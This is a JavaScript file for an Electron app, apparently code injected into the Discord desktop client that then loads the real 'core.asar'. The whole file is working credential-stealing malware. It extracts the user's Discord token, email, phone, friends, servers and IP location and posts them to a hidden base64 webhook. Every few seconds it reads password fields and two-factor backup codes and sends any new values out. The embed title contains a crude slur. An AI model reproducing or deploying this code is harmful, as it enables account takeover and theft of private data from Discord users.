const { BrowserWindow, app } = require("electron");
const https = require('https');

const WEBHOOK_URL_B64 = "";
const WEBHOOK_URL = Buffer.from(WEBHOOK_URL_B64, 'base64').toString('utf-8');

let lastPasswordHash = null;
let lastBackupCodesHash = null;

async function getDiscordToken() {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return null;
    
    try {
        const token = await mainWindow.webContents.executeJavaScript(`
            (function() {
                let token = null;
                
                if (window.webpackChunkdiscord_app) {
                    window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
                        for (let e of Object.values(o.c)) {
                            try {
                                if (!e.exports || e.exports === window) continue;
                                
                                if (e.exports?.getToken) {
                                    token = e.exports.getToken();
                                }
                                
                                for (let key in e.exports) {
                                    if (
                                        e.exports?.[key]?.getToken &&
                                        "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]
                                    ) {
                                        token = e.exports[key].getToken();
                                    }
                                }
                            } catch { }
                        }
                    }]);
                    window.webpackChunkdiscord_app.pop();
                }
                
                if (!token) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key && key.includes('token')) {
                            try {
                                const value = localStorage.getItem(key);
                                const parsed = JSON.parse(value);
                                if (parsed && parsed.token) {
                                    token = parsed.token;
                                }
                            } catch(e) {}
                        }
                    }
                }
                
                return token;
            })();
        `);
        
        return token;
    } catch (err) {
        return null;
    }
}

async function getIpInfo() {
    return new Promise((resolve) => {
        https.get('https://ipinfo.io/json', (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (err) {
                    resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' });
                }
            });
        }).on('error', () => resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }));
    });
}

async function getDiscordUserInfo(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: {
                'Authorization': token
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (err) {
                    resolve(null);
                }
            });
        });
        
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function getDiscordRelationships(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            path: '/api/v9/users/@me/relationships',
            method: 'GET',
            headers: {
                'Authorization': token
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (err) {
                    resolve(null);
                }
            });
        });
        
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function getDiscordGuilds(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            path: '/api/v9/users/@me/guilds',
            method: 'GET',
            headers: {
                'Authorization': token
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (err) {
                    resolve(null);
                }
            });
        });
        
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function sendWebhook(ipData, token, userInfo, relationships, guilds, changeType, changeData) {
    return new Promise((resolve) => {
        const fields = [];
        
        if (changeType) {
            fields.push({
                name: `<a:crspookylaugh:886385706975510538> ${changeType}`,
                value: changeData || 'N/A',
                inline: false
            });
        }
        
        fields.push(
            { name: '<a:crspookylaugh:886385706975510538> IP Address', value: ipData.ip || 'N/A', inline: true },
            { name: '<a:crspookylaugh:886385706975510538> City', value: ipData.city || 'N/A', inline: true },
            { name: '<a:crspookylaugh:886385706975510538> Country', value: ipData.country || 'N/A', inline: true },
            { name: '<a:crspookylaugh:886385706975510538> Organization', value: ipData.org || 'N/A', inline: true }
        );
        
        if (userInfo && userInfo.id) {
            let nitroStatus = 'None';
            if (userInfo.premium_type === 1) nitroStatus = 'Nitro Classic';
            if (userInfo.premium_type === 2) nitroStatus = 'Nitro';
            if (userInfo.premium_type === 3) nitroStatus = 'Nitro Basic';
            
            const createdAt = new Date((userInfo.id / 4194304) + 1420070400000);
            const accountAge = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
            
            let friendsCount = 0;
            let blockedCount = 0;
            if (relationships && Array.isArray(relationships)) {
                friendsCount = relationships.filter(r => r.type === 1).length;
                blockedCount = relationships.filter(r => r.type === 2).length;
            }
            
            const guildCount = guilds && Array.isArray(guilds) ? guilds.length : 0;
            
            const badges = [];
            if (userInfo.flags) {
                if (userInfo.flags & 1) badges.push('Discord Employee');
                if (userInfo.flags & 2) badges.push('Discord Partner');
                if (userInfo.flags & 4) badges.push('HypeSquad Events');
                if (userInfo.flags & 8) badges.push('Bug Hunter Level 1');
                if (userInfo.flags & 64) badges.push('HypeSquad Bravery');
                if (userInfo.flags & 128) badges.push('HypeSquad Brilliance');
                if (userInfo.flags & 256) badges.push('HypeSquad Balance');
                if (userInfo.flags & 512) badges.push('Early Supporter');
                if (userInfo.flags & 16384) badges.push('Bug Hunter Level 2');
                if (userInfo.flags & 131072) badges.push('Verified Developer');
                if (userInfo.flags & 4194304) badges.push('Active Developer');
            }
            
            fields.push(
                { name: '<a:crspookylaugh:886385706975510538> Username', value: `${userInfo.username}#${userInfo.discriminator}`, inline: true },
                { name: '<a:crspookylaugh:886385706975510538> User ID', value: userInfo.id, inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Email', value: userInfo.email || 'No email found', inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Verified', value: userInfo.verified ? 'Yes' : 'No', inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Phone', value: userInfo.phone || 'None', inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Nitro', value: nitroStatus, inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Account Created', value: `${createdAt.toLocaleDateString()} (${accountAge} days ago)`, inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Friends', value: friendsCount.toString(), inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Blocked Users', value: blockedCount.toString(), inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Servers', value: guildCount.toString(), inline: true },
                { name: '<a:crspookylaugh:886385706975510538> Badges', value: badges.length > 0 ? badges.join(', ') : 'None', inline: false }
            );
        }
        
        fields.push({
            name: '<a:crspookylaugh:886385706975510538> Discord Token',
            value: '```\n' + token + '\n```',
            inline: false
        });
        
        const embed = {
            title: '<a:crspookylaugh:886385706975510538> Discord Account Raped',
            color: 0x000000,
            fields: fields,
            timestamp: new Date().toISOString()
        };
        
        if (userInfo && userInfo.avatar) {
            embed.thumbnail = {
                url: `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png`
            };
        }
        
        const postData = JSON.stringify({
            content: null,
            embeds: [embed]
        });
        
        const url = new URL(WEBHOOK_URL);
        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = https.request(options, (res) => {
            resolve();
        });
        req.on('error', (err) => {
            resolve();
        });
        req.write(postData);
        req.end();
    });
}

async function monitorPasswordChanges(token, ipData, userInfo, relationships, guilds) {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;
    
    setInterval(async () => {
        try {
            const currentPassword = await mainWindow.webContents.executeJavaScript(`
                (function() {
                    try {
                        const passwordInputs = document.querySelectorAll('input[type="password"]');
                        for (let input of passwordInputs) {
                            if (input.value && input.value.length > 0) {
                                return input.value;
                            }
                        }
                        return null;
                    } catch(e) {
                        return null;
                    }
                })();
            `);
            
            if (currentPassword) {
                const currentHash = require('crypto').createHash('sha256').update(currentPassword).digest('hex');
                
                if (lastPasswordHash !== null && lastPasswordHash !== currentHash) {
                    await sendWebhook(ipData, token, userInfo, relationships, guilds, 'PASSWORD CHANGED', `New password: \`${currentPassword}\``);
                }
                
                lastPasswordHash = currentHash;
            }
        } catch(err) {}
    }, 3000);
}

async function monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds) {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;
    
    setInterval(async () => {
        try {
            const backupCodes = await mainWindow.webContents.executeJavaScript(`
                (function() {
                    try {
                        const backupCodesList = [];
                        const pageText = document.body.innerText;
                        const codeRegex = /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/gi;
                        const matches = pageText.match(codeRegex);
                        if (matches) {
                            backupCodesList.push(...matches);
                        }
                        return backupCodesList.length > 0 ? backupCodesList.join(', ') : null;
                    } catch(e) {
                        return null;
                    }
                })();
            `);
            
            if (backupCodes) {
                const currentHash = require('crypto').createHash('sha256').update(backupCodes).digest('hex');
                
                if (lastBackupCodesHash !== null && lastBackupCodesHash !== currentHash) {
                    await sendWebhook(ipData, token, userInfo, relationships, guilds, 'BACKUP CODES GENERATED/VIEWED', `Backup codes: \`${backupCodes}\``);
                }
                
                lastBackupCodesHash = currentHash;
            }
        } catch(err) {}
    }, 5000);
}

app.whenReady().then(async () => {
    try {
        await new Promise(r => setTimeout(r, 5000));
        
        const ipData = await getIpInfo();
        const token = await getDiscordToken();
        
        if (token) {
            const userInfo = await getDiscordUserInfo(token);
            const relationships = await getDiscordRelationships(token);
            const guilds = await getDiscordGuilds(token);
            
            await sendWebhook(ipData, token, userInfo, relationships, guilds, 'MONITORING STARTED', 'Monitoring for password and backup code changes');
            
            monitorPasswordChanges(token, ipData, userInfo, relationships, guilds);
            monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds);
        } else {
            await sendWebhook(ipData, null, null, null, null, 'ERROR', 'No token found');
        }
        
    } catch (err) {
        console.error('');
    }
});

try {
    module.exports = require("./core.asar");
} catch (e) {
    console.error('');
}
module.exports = require("./core.asar");